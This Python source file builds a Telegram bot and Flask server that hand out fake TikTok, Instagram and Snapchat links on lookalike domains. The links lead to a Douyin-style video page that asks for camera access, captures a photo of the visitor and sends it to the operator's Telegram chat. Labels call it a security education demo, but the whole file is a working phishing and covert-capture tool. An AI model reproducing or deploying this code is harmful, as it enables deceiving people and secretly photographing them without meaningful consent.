import telebot
import secrets
import threading
import requests
from flask import Flask, request, Response
import os
import random

# ========== TELEGRAM BOT SETUP ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Store active sessions
active_sessions = {}

# ========== FAKE DOMAINS LIST ==========
FAKE_DOMAINS = [
    "tiktok-viral.com",
    "instagram-story.net",
    "snapchat-lens.org",
    "tiktok-trending.com",
    "insta-secure-login.com"
]

def generate_fake_url(platform):
    session_id = secrets.token_hex(8)
    domain = random.choice(FAKE_DOMAINS)
    return f"https://{domain}/{session_id}", session_id

# ========== HTML PAGE (TikTok Style + Camera) ==========
HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>抖音 - 热门视频</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        .video-container { position: relative; width: 100%; height: 100vh; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .overlay { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); padding: 20px; color: white; }
        .username { font-size: 16px; font-weight: bold; margin-bottom: 5px; }
        .username span { color: #ff0050; }
        .caption { font-size: 14px; margin-bottom: 10px; }
        .music { font-size: 12px; color: #ccc; }
        .side-buttons { position: absolute; right: 10px; bottom: 100px; display: flex; flex-direction: column; gap: 20px; }
        .side-btn { text-align: center; color: white; }
        .side-btn .icon { font-size: 30px; margin-bottom: 5px; }
        .side-btn .count { font-size: 12px; }
        .camera-prompt { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 100; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 20px; }
        .camera-prompt h2 { color: #ff0050; margin-bottom: 20px; font-size: 22px; }
        .camera-prompt p { color: white; text-align: center; line-height: 1.5; margin-bottom: 30px; }
        .allow-btn { background: #ff0050; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .deny-btn { background: transparent; color: #888; border: 1px solid #888; padding: 10px 30px; border-radius: 30px; font-size: 14px; cursor: pointer; }
        .warning { position: fixed; bottom: 20px; left: 20px; right: 20px; background: rgba(0,0,0,0.7); color: #ff9800; font-size: 10px; padding: 8px; text-align: center; border-radius: 5px; z-index: 101; }
    </style>
</head>
<body>
    <div class="video-container">
        <video id="video" autoplay playsinline muted loop></video>
        <div class="overlay">
            <div class="username"><span>@</span>热门推荐</div>
            <div class="caption">🎵 这个视频太精彩了！立即观看 🔥</div>
            <div class="music">♬ 原声 - 热门音乐</div>
        </div>
        <div class="side-buttons">
            <div class="side-btn"><div class="icon">❤️</div><div class="count">258K</div></div>
            <div class="side-btn"><div class="icon">💬</div><div class="count">1.2K</div></div>
            <div class="side-btn"><div class="icon">⭐</div><div class="count">收藏</div></div>
            <div class="side-btn"><div class="icon">↗️</div><div class="count">分享</div></div>
        </div>
    </div>
    <div class="warning">⚠️ 网络安全教育演示 - 相机权限测试</div>
    <script>
        const sessionId = "''' + '{session_id}' + '''";
        let stream = null;
        
        function showCameraPrompt() {
            const prompt = document.createElement('div');
            prompt.className = 'camera-prompt';
            prompt.innerHTML = `
                <h2>📸 需要相机权限</h2>
                <p>为了继续观看视频，请允许使用相机<br>这是网络安全教育演示</p>
                <button class="allow-btn" id="allowCamera">允许使用相机</button>
                <button class="deny-btn" id="denyCamera">拒绝</button>
            `;
            document.body.appendChild(prompt);
            document.getElementById('allowCamera').onclick = startCamera;
            document.getElementById('denyCamera').onclick = () => { alert('需要相机权限才能继续'); prompt.remove(); };
        }
        
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                document.querySelector('.camera-prompt')?.remove();
                setTimeout(captureAndSend, 1000);
            } catch(err) { alert('无法访问相机。请检查权限设置。'); }
        }
        
        async function captureAndSend() {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const form = new FormData();
                form.append('photo', blob);
                form.append('sessionId', sessionId);
                await fetch('/upload', { method: 'POST', body: form });
                document.body.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.9);color:#ff0050;padding:20px;border-radius:10px;text-align:center"><h2>✅ 演示完成</h2><p style="color:#aaa;">相机权限已被演示</p></div>';
                if (stream) stream.getTracks().forEach(track => track.stop());
            }, 'image/jpeg', 0.8);
        }
        
        showCameraPrompt();
    </script>
</body>
</html>'''

# ========== FLASK ROUTES ==========
@app.route('/<session_id>')
def index(session_id):
    return Response(HTML_TEMPLATE.replace('{session_id}', session_id), mimetype='text/html')

@app.route('/upload', methods=['POST'])
def upload():
    session_id = request.form.get('sessionId')
    photo = request.files.get('photo')
    
    if photo and session_id:
        # Forward photo to your Telegram
        files = {'photo': ('capture.jpg', photo, 'image/jpeg')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': f'🎯 相机捕获 | Session: {session_id}'}
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
        return 'OK', 200
    return 'No photo', 400

@app.route('/')
def home():
    return 'Bot is running'

# ========== TELEGRAM BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, 
        "🔐 *安全教育相机机器人*\n\n"
        "可用命令:\n"
        "/tiktok - 生成抖音风格链接\n"
        "/instagram - 生成Instagram风格链接\n"
        "/snapchat - 生成Snapchat风格链接\n"
        "/all - 生成所有平台链接\n"
        "/help - 帮助信息\n\n"
        "⚠️ 仅用于网络安全教育",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['tiktok'])
def tiktok_link(message):
    railway_url = os.environ.get('RAILWAY_URL', 'https://your-project.up.railway.app')
    session_id = secrets.token_hex(8)
    fake_domain = f"https://tiktok-viral.com/{session_id}"
    real_link = f"{railway_url}/{session_id}"
    
    bot.reply_to(message, 
        f"🎵 *抖音风格链接*\n\n"
        f"🔗 {fake_domain}\n\n"
        f"⚠️ 点击后会请求相机权限\n"
        f"这是网络安全教育演示\n\n"
        f"实际链接: {real_link}",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['instagram'])
def instagram_link(message):
    railway_url = os.environ.get('RAILWAY_URL', 'https://your-project.up.railway.app')
    session_id = secrets.token_hex(8)
    fake_domain = f"https://instagram-story.net/{session_id}"
    real_link = f"{railway_url}/{session_id}"
    
    bot.reply_to(message,
        f"📸 *Instagram风格链接*\n\n"
        f"🔗 {fake_domain}\n\n"
        f"⚠️ 教育用途 - 相机权限演示",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['all'])
def all_links(message):
    railway_url = os.environ.get('RAILWAY_URL', 'https://your-project.up.railway.app')
    t_session = secrets.token_hex(4)
    i_session = secrets.token_hex(4)
    s_session = secrets.token_hex(4)
    
    tiktok_link = f"{railway_url}/{t_session}"
    instagram_link = f"{railway_url}/{i_session}"
    snapchat_link = f"{railway_url}/{s_session}"
    
    bot.reply_to(message,
        f"🎭 *所有平台链接*\n\n"
        f"1️⃣ TikTok: {tiktok_link}\n"
        f"2️⃣ Instagram: {instagram_link}\n"
        f"3️⃣ Snapchat: {snapchat_link}\n\n"
        f"⚠️ 仅用于网络安全教育",
        parse_mode='Markdown'
    )

# ========== RUN BOTH ==========
def run_flask():
    app.run(host='0.0.0.0', port=5000)

def run_bot():
    bot.polling()

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    threading.Thread(target=run_bot).start()
